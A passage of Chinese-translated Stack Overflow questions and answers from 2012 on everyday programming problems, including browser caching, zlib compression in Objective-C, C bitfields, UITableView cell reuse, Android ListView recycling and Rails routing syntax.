第四，以像素为单位的设备尺寸经常被非常高密度的显示器或新的“视口”严重扭曲。因此，根据您的测试，一些智能手机似乎是平板电脑。设备像素密度可以容纳在您的逻辑中。“视口”可以而且应该由“元”语句控制，因为通常的默认值无论如何都会使其“工作”，但代价是通常不能正确处理更智能的响应式布局。

（有关缺乏对媒体查询、媒体查询可变性和密度问题的支持的替代方法，请参阅[http://www.ckollars.org/alternative-to-media-queries.html](http://www.ckollars.org/alternative-to-media-queries.html)）

# html - 没有 Ctrl + F5 网站不会在浏览器中更新

> ID：10270201
> 
> 赞同：-1
> 
> 时间：2012-04-22T17:21:01.400
> 
> 标签：html, css, refresh

我正在运行一个只有 HTML 和 CSS 的基本网站。每当我将新文件推送到网站时，新文件不会显示在浏览器中，直到我执行 CTRL + F5（硬刷新）。有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:24:58.283

你必须把它放在你的 head 部分：

```
<meta content="no-cache" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:27:33.137

很可能，您的浏览器在您访问网站时**正在缓存您网站的内容。**下次访问时，它将显示本地缓存副本（除非您“硬刷新”它）。

检查您的页面中是否有任何[与缓存相关的元标记](http://www.webmarketingnow.com/tips/meta-tags-meta-expires.html)，并查看使用[无缓存标记](http://www.htmlgoodies.com/beyond/reference/article.php/3472881/So-You-Dont-Want-To-Cache-Huh.htm)是否会有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T17:33:15.173

如果您出于开发目的这样做，我会考虑使用实时重新加载之类的工具，它会在您更新文件时更新您的浏览器。 [http://livereload.com/](http://livereload.com/)

# objective-c - 如何使用 zlib 压缩 NSData？

> ID：10270203
> 
> 赞同：2
> 
> 时间：2012-04-22T17:21:17.117
> 
> 标签：objective-c, nsstring, gzip, nsdata, zlib

1.  我想使用[zlib](http://www.zlib.net/)因为我假设它是最好和最快的方式 gzip `NSData`。但是，有没有更好的方法？

2.  如果没有，我应该在 Xcode 中链接到哪个版本的 zlib 库：libz.dylib、libz.1.dylib、libz.1.1.3.dylib 或 libz.1.2.5.dylib？

3.  请提供如何将 zlib 转换`NSData *normalHTTPBody`为的代码示例`NSData gzippedHTTPBody`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T17:43:29.410

1.  是的，zlib 是用于 gzip 数据的。我知道没有更好的办法。至于速度，您可以选择压缩级别来优化应用程序的速度与压缩。
2.  您可能会发现 libz.dylib 和 libz.1.dylib 是 libz.1.2.5.dylib 的符号链接。您应该使用 libz.1.2.5.dylib 而不是 1.1.3，因为两者之间存在许多错误修复和性能增强。
3.  [您的答案中的此链接](http://www.clintharris.net/2009/how-to-gzip-data-in-memory-using-objective-c/)是一个评论非常好的示例。您还可以查看这个zlib 使用（在 C 中）[的大量评论示例。](http://zlib.net/zlib_how.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T17:23:33.933

3\. 以下是我在网上找到的一些解决方案：

*   [http://code.google.com/p/google-toolbox-for-mac/source/browse/trunk/Foundation/GTMNSData%2Bzlib.m](http://code.google.com/p/google-toolbox-for-mac/source/browse/trunk/Foundation/GTMNSData%2Bzlib.m)
*   [http://www.cocoadev.com/index.pl?NSDataCategory](http://www.cocoadev.com/index.pl?NSDataCategory)
*   [http://code.google.com/p/polkit/source/browse/trunk/Extensions/NSData%2BGZip.m?r=135](http://code.google.com/p/polkit/source/browse/trunk/Extensions/NSData%2BGZip.m?r=135)
*   [https://github.com/st3fan/cocoa-utils/blob/master/src/NSDataGZipAdditions.m](https://github.com/st3fan/cocoa-utils/blob/master/src/NSDataGZipAdditions.m)
*   [http://www.clintharris.net/2009/how-to-gzip-data-in-memory-using-objective-c/](http://www.clintharris.net/2009/how-to-gzip-data-in-memory-using-objective-c/)
*   [http://deusty.blogspot.com/2007/07/gzip-compressiondecompression.html](http://deusty.blogspot.com/2007/07/gzip-compressiondecompression.html)

# php - 如何获取应用程序的访问令牌，其用户正在使用 facebook 移动应用程序？

> ID：10270206
> 
> 赞同：-2
> 
> 时间：2012-04-22T17:21:24.350
> 
> 标签：php, facebook, facebook-php-sdk

我只想从那些从移动设备（不是 iOS 或 Android）使用 facebook 的用户那里获取我的应用程序的访问令牌，这可能吗？帮助很快，我没有从谷歌得到任何结果，我希望在 5 月 1 日之前让我找到正确的方法，谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T06:44:55.393

您仍然可以使用服务器上的 PHP SDK 通过 Graph API 检索数据。[下载 SDK](https://github.com/facebook/php-sdk)后，您所要做的就是对其进行初始化，然后您就可以调用 Graph API，然后将数据传递给您的用户（即使他们没有启用 JavaScript）。

下面是初始化 PHP SDK 的方法（取自[Facebook 文档](https://developers.facebook.com/docs/reference/php/)-

```
require_once("facebook.php");

$config = array();
$config[‘appId’] = 'YOUR_APP_ID';
$config[‘secret’] = 'YOUR_APP_SECRET';

$facebook = new Facebook($config); 
```

现在您有了`$facebook`对象，您可以使用如下 API 调用授权用户：

*   Facebook::getUser()
*   Facebook::getLoginUrl()
*   Facebook::getLogoutUrl()

您首先要阅读有关`getLoginUrl()` [此处](https://developers.facebook.com/docs/reference/php/facebook-getLoginUrl/)的内容。

# c - C 位域（可能是位精度）

> ID：10270207
> 
> 赞同：2
> 
> 时间：2012-04-22T17:21:26.417
> 
> 标签：c, bit-manipulation

做一些经验来理解位域

嗨有这个代码：

```
01  #include <stdio.h>
02  #include <stdlib.h>
03
04  void AddToBitfield(int *bitfield, int bitCount, int value);
05  int ReadFromBitfield(int *bitfield, int bitCount);
06
07  int main(){
08      /*Device list (0 Modem,1 Keyboard,2 Mouse,3 Speakers,4 Joystick,5 Flash Drive,6 Scanner,7 Printer,8 Microphone,9 Webcam,10 Monitor)*/
09      int device=0,memLoc=0,data=0;
10      int number = 0;
11
12      memLoc = 01; /*put 01 or 10*/
13      device = 15; /*Device id*/
14      data = 12343; /*Data to store - Only less or equal then 65535*/
15
16      AddToBitfield(&number,4,device);
17      AddToBitfield(&number,16,data);
18      AddToBitfield(&number,2,memLoc);
19
20      printf("--%d---\n",number);
21
22      printf("Memory location: %d\n",ReadFromBitfield(&number,2));
23      printf("Data stored: %d\n",ReadFromBitfield(&number,16));
24      printf("Device: %d\n",ReadFromBitfield(&number,4));
25
26      return 0;
27  }
28
29  void AddToBitfield(int *bitfield, int bitCount, int value){
30      *bitfield <<= bitCount;
31      *bitfield |= value;
32  }
33
34  int ReadFromBitfield(int *bitfield, int bitCount){
35      int value = *bitfield & ((1 << bitCount) - 1);
36      *bitfield >>= bitCount;
37
38      return value;
39  } 
```

使用`data = 12343;`and with`memLoc = 01;`或`memLoc = 10;`printf 将按预期显示所有内容。

使用`data = 12346;`and with`memLoc = 01;`或`memLoc = 10;`相同的东西。printf 将按预期显示所有内容。

但是，如果我使用`data = 12344;`或者`data = 12345;`如果我使用`memLoc = 01;`print 将显示两种情况下的预期，但如果我`memLoc = 10;`在第一种情况下使用它会打印`Data stored: 12346`在第二种情况下`Data stored: 12347`。

为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:46:06.633

您可以使用此 C`struct`来读取/写入位域：

```
struct MyType
{
    uint16_t memLoc:4;
    uint16_t device:4;
    uint16_t _reserved:8;
    uint16_t data;
}; 
```

您的代码将如下所示：

```
int main()
{
    // ...

    struct MyType number;
    uint32_t numberInt;

    number.memLoc = 1;
    number.device = 15;
    number.data = 12343;

    memcpy(&numberInt, &number, sizeof(struct MyType));
    printf("--%d---\n", numberInt);

    printf("Memory location: %d\n", number.memLoc);
    printf("Data stored: %d\n", number.data);
    printf("Device: %d\n", number.device);

    // ...
} 
```

告诉我每个字段有多少位，我会为您修复该结构。

这是一篇关于位域的文章：[http ://en.wikipedia.org/wiki/Bit_field](http://en.wikipedia.org/wiki/Bit_field)

# ios5 - UITableView 的行中有多个 UITablewViewCell

> ID：10270209
> 
> 赞同：0
> 
> 时间：2012-04-22T17:21:39.570
> 
> 标签：ios5, uitableview

UITableView 的单行上是否可以有多个 UITableViewCell(s)？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T17:23:37.553

不，你不能。就那么简单。
`UITableView`与其说是表格，不如说是一个列表。

# sharepoint-2010 - 单击 Sharepoint 2010 中的管理内容和结构时出错

> ID：10270212
> 
> 赞同：1
> 
> 时间：2012-04-22T17:22:39.543
> 
> 标签：sharepoint-2010

我在我的 sharepoint 2010 站点中部署了一个功能，并且有一个列表。该功能运行良好，但是当我单击站点设置 --> 管理内容和结构时，它会导致我进入错误页面。日志中出现的错误如下：

**无法检索功能 [FEATURE GUID]、列表模板 [TEMPLATE] 的列表架构；预计会在以下位置找到它：“”**

如何解决此问题，非常感谢任何帮助！

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T00:06:13.783

您在某处有一个列表或库，该列表或库基于该功能中包含的列表模板。

浏览您的列表/库，其中一个可能会在您尝试访问它时引发错误。

使用 PowerShell 删除此列表或库，您现在将能够再次访问管理内容和结构。

编辑：对不起 - 只是重新阅读你的问题。如果基于您的功能的列表/库运行良好，那么我预计管理内容和结构不会出现问题。您是否有在测试中创建的导致问题的旧版本的列表/库？

# java - Java - 如何为 udp 使用选择器？

> ID：10270215
> 
> 赞同：-1
> 
> 时间：2012-04-22T17:22:45.040
> 
> 标签：java, select, udp

在另一个帮助线程中，有人告诉我`select()`为我的 UDP 服务器使用一种方法，但我不知道如何实现它。我的程序挂在一个`socket.receive()`声明上，有人告诉我使用`select()`会有所帮助。

谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-22T23:44:28.727

如果您的代码挂在 receive() 方法上，那就是它应该做的事情。如果您不希望它永远阻塞，请使用合适的值调用 DatagramSocket.setSoTimeout()。

在论坛上询问如何使用 NIO 是不合适的。Oracle 网站上有教程，JDK 中提供了示例代码。

# php - PHP - 如何做一个高效的用户在线和离线确定器？

> ID：10270216
> 
> 赞同：0
> 
> 时间：2012-04-22T17:22:50.967
> 
> 标签：php, mysql, database, chat

我有 1000 个用户，他们有像 G+ 圈子这样的同伴，但我想知道一个人是否在线聊天，但我试图用时间戳更新聊天数据库，效率不高我想知道是否有是另一种方式，即使复杂但有效的想法请求

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:50:35.047

使用内存存储引擎创建一个 MySQL 表。假设您有 3 列 - id、用户名、last_seen。将 ID 设置为主索引，然后您只需在用户执行某项操作（或通过 Ajax）时更新 last_seen，然后您只需获取 last_seen（例如通过 Ajax）并将其与当前时间戳进行比较。我怀疑它可能比这更简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-06-22T17:26:47.700

使用 WebSocket。有这个 jQuery 插件允许您使用 Websockets，同时为不支持的浏览器优雅地降级。在 PHP 方面，有[https://code.google.com/archive/p/jquery-graceful-websocket/](https://code.google.com/archive/p/jquery-graceful-websocket/) 类，它似乎是 PHP WS 服务器使用最广泛的类。

# php - 我的 json 结构有问题吗？

> ID：10270221
> 
> 赞同：0
> 
> 时间：2012-04-22T17:23:20.823
> 
> 标签：php, javascript, json

我会像这样拥有我的PHP：

```
array(2) {
  [0]=>
  object(stdClass)#20 (1) {
    ["name"]=>
    string(5) "Indie"
  }
  [1]=>
  object(stdClass)#21 (1) {
    ["name"]=>
    string(12) "Cult-classic"
  }
} 
```

然后对其进行 json_encode 编码，结果如下：

```
0: {name:Indie}
name: "Indie"
1: {name:Cult-classic}
name: "Cult-classic" 
```

那么为什么这是未定义的（它实际上只是遍历将结构视为字符串的每个字符。

```
for(var i = 0; i < tagged.length; i++) {
    alert(tagged[i].name);
} 
```

更新：

```
$.post('/host/tags/item_tags/' + movieId,
    function(tagged) {
        alert(tagged);
        for(var i = 0; i < tagged.length; i++) {
            alert(tagged[i]);
        }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:26:36.317

不知何故，我怀疑`json_encode()`是给你那种破碎的输出。这是适当的输出：

```
[
    {"name":"Indie"},
    {"name":"Cult-classic"}
] 
```

所以要回答你的问题，是的，你的输出有问题。您可以在以下位置验证您的 JSON：http: [//jsonformatter.curiousconcept.com/](http://jsonformatter.curiousconcept.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:56:32.263

`.each()`而是沿着 json 数据遍历

```
function(tagged) {        
    $.each(tagged, function(k,v) {
       alert(v);
    });
} 
```

# java - 对有 4 个除数的数字进行排序（java）

> ID：10270236
> 
> 赞同：3
> 
> 时间：2012-04-22T17:24:48.597
> 
> 标签：java, arrays, algorithm, sorting, primes

我需要对一系列数字进行排序。数字可以从 0 到 1000。用户输入的数字范围在 0 到 1000 之间。因此，例如，如果他们可能输入 0 -> 500。

我的目标是获取给定范围内的所有数字，并输出该范围内只有 4 个可能除数的所有数字（包括 1 和它本身。

我想知道我是否应该使用这样的算法[，](http://en.wikipedia.org/wiki/Greatest_common_divisor#Using_Euclid.27s_algorithm)或者我是否应该检查和 int 数组，其中包含 1 - 1000 可被 4 整除的所有数字（因此该数组没有 1-1000 它有该范围内的数字只能被整除 4 次。需要手动工作才能将所有可能的除数添加到该数组中）。

我希望让它变得高效，只是我不确定使用这样的算法是否会非常快。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-22T17:36:02.377

您正在寻找一个数字，它是两个素数的乘积*编辑：或素数的立方*。由于您的数字很小，您可以制作一个 2 到 500 之间素数的简短表格。然后，从 2 开始，将每个素数乘以它上面的每个素数，直到超过上限。

编辑：这是作业吗？如果是的话，我可能已经说得太多了。如果不是，如果我的答案没有意义，我可以提供一些代码或伪代码。

编辑：谢谢，Daniel Fischer：我错过了素数的立方体。您可以检查这些并将其包含在您的外部循环中。（在将素数乘以它上面的每一个之前，看看它的立方体是否在所需的范围内。）

一般来说：

```
for ( p1 is a prime in your list, except for the last) {
    if p1 cubed is in your range, add it to the answer
    for (p2 is a prime in your list greater than p1) {
        if p2*p1 is in your range, add it to the answer
        //optimization: break when you know you won't find any more
    }
}
// optimization: calculate the ranges of p1 and p2 to be included 
// before you start each loop
// (probably only worthwhile if you raise the limit to something 
// much larger than 1000) 
```

对于这种规模的数字，它肯定足够快。我在一毫秒内就完成了（找到 0 到 1000 之间的 292 个数字。我使用了硬编码的素数——对于这个输入范围，你只需要其中的 95 个。）

# android - Mono for Android 可以与 Visual Web Developer Express 一起使用吗？

> ID：10270237
> 
> 赞同：1
> 
> 时间：2012-04-22T17:24:49.910
> 
> 标签：android, mono, xamarin.android, visual-web-developer-2010

我下载了 Mono for Android 并按照安装教程进行操作。我正在使用 Visual Web Developer 2010 Express 我已经完成了[这部分](http://docs.xamarin.com/android/getting_started/installation/Installation_for_Windows#Configuring_Visual_Studio)，您可以在其中配置 VS 设置，但在 VWD 的选项中没有看到“Mono for Android”。

是否支持 Visual Web Developer？我可以使用 Mono 吗？

TIA

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T17:35:49.773

不幸的是，Visual Studio 2010 的 express 版本不支持 Mono for Android 所需的插件，因此不支持。但是，您可以在 Windows 上使用 MonoDevelop，它具有完整的 Mono for Android 支持。MonoDevelop 是免费和开源的，并作为 Mono for Android 安装程序的一部分自动安装。

# iphone - 一个单元格中的 UITableViewCell 图像更新也会自动/烦人地到达其他单元格

> ID：10270239
> 
> 赞同：0
> 
> 时间：2012-04-22T17:25:11.483
> 
> 标签：iphone, cocoa-touch

我是 iOS 编程的新手（但我已经完成了我的作业......浏览了有关 iOS 和谷歌教程的书籍）。我正在尝试这样做：

1.  用户在文本字段中输入一些文本，并选择一个表情符号。

2.  然后我将用户输入文本添加到 UITableViewCell 并将单元格添加到 UITableView。

**问题 ：**

> 比如说，用户输入一些文本并选择“快乐”表情符号。
> 
> 表情符号和文本在 UITableView 中得到更新。这没问题。
> 
> 接下来，用户输入一些其他文本，并选择“悲伤”表情符号。
> 
> 问题是：前一个单元格中的表情符号（它是一个快乐的表情符号）也变为“悲伤”；但我不希望以前的单元格更改。

```
@synthesize table;
@synthesize buttonEmotionHappy;
@synthesize buttonEmotionLaugh;

int myEmoticonNum;

/**
 * Called when the button's pressed
 * sender : the button which's pressed, consequently invoking this
 */
-(IBAction)buttonPressed:(id)sender {

    NSLog(@"Button Pressed");
    [self addToInputArray:[textFieldUserInput text]];

    [table reloadData];
    textFieldUserInput.text = @"";
}

-(IBAction)emotionExpressed:(id)sender {

    if (sender == buttonEmotionHappy) {

        NSLog(@"Happy emoticon chosen");
        myEmoticonNum = 1;

    } else if (sender == buttonEmotionSad) {

        NSLog(@"Sad emoticon chosen");
        myEmoticonNum = 2;
    }
}

...
...
...
...
#pragma mark -
#pragma mark Table View Data Source Methods

-(NSInteger) tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return [self.arrayInput count];
}

-(UITableViewCell *) tableView:(UITableView *)tableView
     cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *SimpleTableIdentifier = @"SimpleTableIdentifier";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:SimpleTableIdentifier];

    if (cell == nil) {

       cell = [[UITableViewCell alloc] 
            initWithStyle:UITableViewCellStyleDefault 
            reuseIdentifier:SimpleTableIdentifier];
    }

    if (myEmotionNum == 1) {
        cell.imageView.image = [UIImage imageNamed:@"SmileyHappy.png"];

    } else if (myEmotionNum == 2) {
        cell.imageView.image = [UIImage imageNamed:@"SmileySad.png"];
    }  

    NSUInteger row = [indexPath row];
    cell.textLabel.text = [arrayInput objectAtIndex:row];

    return cell;
}

-(void) addToInputArray: (NSString *)userInput {

    [arrayInput insertObject:userInput atIndex:0];
    NSLog(@"Added %@ to User-Input-Array", userInput);
} 
```

谢谢，普里亚

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:31:45.400

您必须存储`imageEmotion`每个单元格，而不是每个表格视图。
尝试将其作为属性添加到您的自定义单元格类中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-23T01:28:19.940

您正在存储一个值`myEmotionNum`，这意味着每个单元格都将获得相同的表情符号。您需要每行/单元格存储一种情绪。

您可以为情绪 ID 设置一个并行数组（如`self.arrayEmotions`）或使用单个数组并存储字典。在 JSON 格式中，我建议如下：

```
[ { "text": "Hello", "emotion": 1 },
  { "text": "Next row", "emotion": 2} ] 
```

所以你`addToInputArray:`看起来像：

```
NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithObjectsAndKeys:
  userInput, @"text", [NSNumber numberWithInt:0], @"emotion"];
[arrayInput insertObject:dict atIndex:0]; 
```

在您的`tableView:cellForRowAtIndexPath:`方法中，您会得到如下文本：

```
[[arrayInput objectAtIndex:[indexPath row]] objectForKey:@"text"] 
```

和情感 # 出来像：

```
[[[arrayInput objectAtIndex:[indexPath row]] objectForKey:@"emotion"] intValue] 
```

你可以设置情绪 # 像：

```
[[arrayInput objectAtIndex:[indexPath row]] setObject:[NSNumber numberWithInt:someEmoticonNumber] forKey:@"emotion"] 
```

（请注意，字典必须存储对象，这就是您需要转换为/从的原因`NSNumber`）

# android - 配置壁纸时的 android 动态壁纸崩溃

> ID：10270241
> 
> 赞同：3
> 
> 时间：2012-04-22T17:25:36.210
> 
> 标签：android

我正在为安卓开发动态壁纸。我几乎遵循了 android 的立方体动态壁纸示例，但是在配置动态壁纸时我遇到了崩溃

澄清一下，当我崩溃时它不会崩溃

1.  转到动态壁纸选择屏幕
2.  选择我的壁纸
3.  从那里点击设置

但是当我崩溃时它确实崩溃了

1.  已经将我的壁纸设置为动态壁纸
2.  长按屏幕调出壁纸（见第一张图片）
3.  点击配置...（见第二张图片）

感谢任何帮助。

![在此处输入图像描述](../Images/73253b1517f81840091d9a719cb78431.png) ![在此处输入图像描述](../Images/4fe992accf83dfbc48bfe8ba0417de44.png)

编辑：顺便说一句，logcat 没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T20:01:33.187

没关系。弄清楚我做错了什么。将 android:permission="android.permission.BIND_WALLPAPER" 添加到应用程序标签而不是像我应该拥有的服务标签。

# javascript - 在不知道其名称的情况下获取哈希图的键

> ID：10270242
> 
> 赞同：2
> 
> 时间：2012-04-22T17:25:45.583
> 
> 标签：javascript, hashmap

对象中只有一个键/值，如何在不知道键名的情况下获取它们？（如果它是可能的）

```
var m = {x:5}; // we don't know x is the key 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:28:12.980

你可以使用`hasOwnProperty`这样的东西 [https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/HasOwnProperty](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/HasOwnProperty)

```
var m = {x:5};

function keys(obj)
{
    var keys = [];

    for(var key in obj)
    {
        if(obj.hasOwnProperty(key)) {    
        {
            keys.push(key);
        }
    }

    return keys;
}

console.log(m); 
```

因此，利用这些知识，您可以编写一个基本上检查给定键是否存在于对象中的函数：

```
function hasKey(obj, key) {
   return obj.hasOwnProperty(key);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T17:32:27.967

`for…in`如果浏览器支持 ES5（或为 ES5 提供 shim），则可以替代循环：

```
var key = Object.keys(m)[0]; 
```

请参阅：[https ://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/keys](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Object/keys)

# android - 为什么 Android View API 关心 ArrayAdapter 的 getViewTypeCount？

> ID：10270252
> 
> 赞同：2
> 
> 时间：2012-04-22T17:26:59.497
> 
> 标签：android, android-listview, android-arrayadapter, recycle

我一直在学习如何创建 custom`ArrayAdapter`并熟悉了重写 ArrayAdapter`getViewTypeCount`和`getItemViewType`方法。

为什么 Android View API 关心返回的“可能的视图类型数量” `getViewTypeCount`？*而且，作为程序员，我*为什么要关心？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T14:00:35.800

我刚刚查看了 Android 源代码，以了解确切`getViewTypeCount`的使用位置。它在抽象`AbsListView`类的“内部`RecycleBin`类”`setViewTypeCount`方法中。

此`setViewTypeCount`方法用于指定 的初始大小`ArrayList<View>`。`scrapViews`这`ArrayList`本身就是一个`ArrayList`of `ArrayList<View>`s - 每个“视图类型计数”一个。

此外，返回的值`getViewTypeCount`被分配给`RecycleBin`的成员变量`mViewTypeCount`。该成员用于控制在 RecycleBin 类中的少数方法中只有一个视图与多个视图的情况下的回收逻辑（正如每个人都在暗示的那样）。

所以答案是，我相信，它`getViewTypeCount`被使用，`RecycleBin`以便它知道它是否只有一个或多个视图要处理。可以这么说。

（感谢大家睁开眼睛回收并激励我阅读源代码。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T18:41:55.673

**Commonsware**对您上一个问题的回答很好地解释了为什么您需要关心这些方法。这是一个小例子：

您有`ListView`100 行和 3 种类型的行：

1.  一个简单的`TextView`
2.  自定义视图（非常复杂）
3.  一个`AnalogClock`视图

你`ListView`是这样开始的：

*   位置 0：TextView <=*第一个可见位置*
*   位置1：自定义视图
*   位置2：自定义视图
*   位置 3：文本视图
*   位置 4：AnalogClock <=*最后可见位置*
*   位置5：自定义视图<=*第一个不可见位置（这里android会提供一个回收视图）*
*   位置 6：文本视图

如果您不实现这些方法，那么 android 将简单地回收视图而不考虑行的类型。因此，在上面的示例中，当用户向下滚动时，将为具有回收视图的行调用`ListView`该方法（不再可见的第 0 行），a (不会用于此位置)。如您所见，这不是您在该位置所期望的视图。因为在方法中你有这样的东西：`getView``5``TextView``convertView``null``getView`

```
 //...
       if (convertView == null) {     
          // inflate views
       } else {
         //just use it    
   //... 
```

您最终会在应该是`custom view`（非常复杂）的行上设置数据，但会得到一个简单的`TextView`. 当您进一步`ListView`向上和向下滚动时，情况会变得更糟。

如果您确实实现了这些方法，那么 android 将知道该`getView`方法将需要 3 种类型的行。当需要显示第 5 行（来自上一个示例）时，android 将调用`getItemViewType`以查看该`getView`方法期望该位置（位置 5）的视图类型。如果找到该类型的回收视图（以前回收），`getView`则将调用该方法并`convertView`设置为该回收视图，否则`getView`将调用该方法并`convertView`设置为`null`。当您滚动`ListView`显示位置 5 时，（唯一）回收视图将是简单的`TextView`. 该`getView`方法需要一个`custom view`（非常复杂的），并且由于找不到该类型的回收视图，因此您`convertView`将`null`有机会对其进行膨胀。

如果滚动`ListView`显示位置 6，则位置 1（不再显示在屏幕上）的视图将被回收，因此`ListView`现在有两个不同类型的视图（`TextView`和一个`custom view`（非常复杂））。然后`getItemViewType`将再次调用，对于这个位置，该`getView`方法需要一个`TextView`. 存在这种类型的回收视图，因此`getView`将调用该方法并将其`convertView`设置为此回收`TextView`。如果您进一步滚动`ListView`并且`getView`需要一个`TextView`或一个`custom view`回收视图（具有正确的类型），将提供。此外，最终类型视图`AnalogCLock`将被回收，因此`ListView`每个列表行类型的回收视图将被重用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T17:31:40.633

在[参考资料中，它说](http://developer.android.com/reference/android/widget/Adapter.html#getViewTypeCount%28%29)“每种类型都代表一组可以在 getView(int, View, ViewGroup) 中转换的视图。”

如果视图不同，则它们不能与不兼容的其他视图一起回收。`1`因此，如果此方法返回与标准回收代码不同的任何内容，`onView`则将不再起作用。

# vb.net - 在 Visual Basic 中使用日历

> ID：10270253
> 
> 赞同：1
> 
> 时间：2012-04-22T17:26:59.737
> 
> 标签：vb.net

如何在vb中将日历用于较低的时间格式？
我试图实现的目标：如果较低的日期是星期六和星期日，则将其替换为同一周的星期五（如果日期 = 2012-04-21 或 2012-04-22，则日期 = 2012-04-20）。

2012-04-20T18:26:43

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T17:45:32.750

只需将一些代码放在一起，无需太多测试。

```
Sub Main
    Dim dt as DateTime = FindDate(Convert.ToDateTime("2012-04-21T18:26:43"))    
    System.Diagnostics.Debug.WriteLine(dt.ToShortDateTime())
End Sub

Public Function FindDate(ByVal inDate as DateTime) as DateTime 
    if (inDate.DayOfWeek = DayOfWeek.Saturday Or inDate.DayOfWeek = DayOfWeek.Sunday) then 
       while (inDate.DayOfWeek <> DayOfWeek.Friday) 
          inDate = inDate.AddDays(-1) 
       end while
    end if 
    return inDate 
End Function 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T18:03:45.797

```
Public Shared Function NoWeekend(ByVal day As DateTime) As DateTime
    If day.DayOfWeek = DayOfWeek.Sunday Then Return day.AddDays(-2)
    If day.DayOfWeek = DayOfWeek.Saturday Then Return day.AddDays(-1)
    Return day
End Function 
```

# ruby-on-rails - 在 routes.rb 中，“#”符号是什么意思？

> ID：10270256
> 
> 赞同：1
> 
> 时间：2012-04-22T17:27:22.310
> 
> 标签：ruby-on-rails, ruby-on-rails-3

在 Ruby on Rails 中，# 符号的含义如下：

```
root to: 'stores#index', as: 'store' 
```

我到处寻找解释，但找不到任何东西！我敢肯定这很简单。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T17:29:44.847

# 用于表示您正在从控制器（类）存储中选择操作（方法）索引。比这还多一点，但本质上 store\index.html 是由 rails 框架路由到的。这是 RESTful 架构的一部分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-22T17:55:01.327

请参阅[此处](http://guides.rubyonrails.org/routing.html)，“stores#index”将重定向到控制器的`index`操作`stores`

# c++ - Windows下MonoDevelop中将c++静态库绑定到项目中

> ID：10270257
> 
> 赞同：0
> 
> 时间：2012-04-22T17:27:27.690
> 
> 标签：c++, windows, monodevelop, xamarin.android

MonoDroid 新手在这里

我想在我在 MonoDroid 下编写的 Android 应用程序中使用静态 c++ 库（它是静态的，因为我想稍后将它移植到 MonoTouch）。我在 Windows 下使用 MonoDevelop，找不到解释我应该如何编译和链接这样的库的教程。我现在正在尝试使用 SWIG 工具包使用 PInvoke 将其绑定到 MonoDroid，并且需要知道例如我应该为 c++ 库使用哪个编译器，我应该在哪里部署生成的 lib 文件以便 MonoDroid 可以使用它等等。可以有人指导我做一些有用的事情吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T16:17:16.323

`.a`由于多种原因，您将无法在 iOS 和 Android 之间使用相同的文件：

*   Android 是 ELF，iOS 是 Mach-O
*   Android 代码需要编译为 Position Independent Code ( `-fPIC`)，因为它最终会在 a 中`.so`，而 iOS 则没有这个要求 (afaik)。
*   它们可能有不同的 ABI 调用约定等。

您需要为每个目标平台重新编译源代码。

鉴于无论如何您都需要重新编译，因此`.a`为 Android 创建文件的意义很小。只需创建一个`.so`. 请参阅[Android NDK](http://developer.android.com/sdk/ndk/index.html)`docs/ANDROID-MK.html`中的内容。

您还可以查看[SanityTests](https://github.com/xamarin/monodroid-samples/tree/master/SanityTests)示例，该示例使用 Android NDK`ndk-build`命令生成共享库：

*   SanityTests.csproj [BuildNativeLibs](https://github.com/xamarin/monodroid-samples/blob/master/SanityTests/SanityTests.csproj) [目标](https://github.com/xamarin/monodroid-samples/blob/master/SanityTests/SanityTests.csproj#L86)调用`ndk-build`.
*   `ndk-build`调用[Android.mk](https://github.com/xamarin/monodroid-samples/blob/master/SanityTests/jni/Android.mk)生成例如`libs\armeabi\libfoo.so`.
*   [AndroidNativeLibrary](http://docs.xamarin.com/android/advanced_topics/build_process#Native_Library_Support)构建操作将本机库捆绑到生成的`.apk`.

# php - 无法在 PHP 中进行文件上传

> ID：10270261
> 
> 赞同：1
> 
> 时间：2012-04-22T17:27:55.937
> 
> 标签：php

我想用 PHP 上传文件。我写

```
<form target="_self" enctype="multipart/form-data">
<input type="file" name="file" id="file" />
<input name="submit" type="submit" value="submit" />
</form>
<?php

if ($_FILES["file"]["error"] > 0)
  {
